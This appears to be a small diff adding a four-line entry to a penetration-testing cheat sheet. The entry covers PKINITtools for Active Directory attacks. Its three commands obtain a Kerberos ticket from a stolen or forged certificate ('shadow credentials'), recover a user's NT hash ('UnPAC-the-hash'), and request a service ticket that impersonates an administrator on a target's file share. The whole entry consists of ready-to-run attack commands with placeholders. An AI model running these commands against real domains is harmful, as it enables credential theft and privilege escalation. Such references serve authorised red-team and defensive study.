@@ -1,0 +1,4 @@
+# PKINITtools — PKINIT exploitation (shadow creds, UnPAC-the-hash)
+python3 gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass password $DOMAIN/$USER $USER.ccache
+python3 getnthash.py -key AS_REP_KEY $DOMAIN/$USER
+python3 gets4uticket.py kerberos+ccache://$DOMAIN\\$USER:$USER.ccache@$DC_IP cifs/$TARGET_IP@$DOMAIN $ADMIN_USER@$DOMAIN admin.ccache
